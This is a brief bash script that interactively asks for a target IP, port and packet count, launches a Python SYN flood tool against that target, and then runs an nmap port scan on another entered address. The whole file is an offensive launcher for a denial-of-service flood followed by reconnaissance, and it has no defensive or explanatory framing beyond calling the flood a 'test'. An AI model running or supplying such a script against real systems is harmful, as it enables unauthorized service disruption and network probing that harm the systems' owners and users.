#!/bin/bash

echo "Give some data before to start the syn flood attack test."
echo "Insert the target IP: "
read target
echo "Insert the target port (i.e 443): "
read port
echo "How many packets do you want to send? "
read packets_number
python3 Python-SYN-Flood-Attack-Tool/py3_synflood_cmd.py -t "$target" -p "$port" -c "$packets_number"
echo "Attack completed! Let's go on with the port scanning attack. Give me the IP target: "
read target
nmap "$target"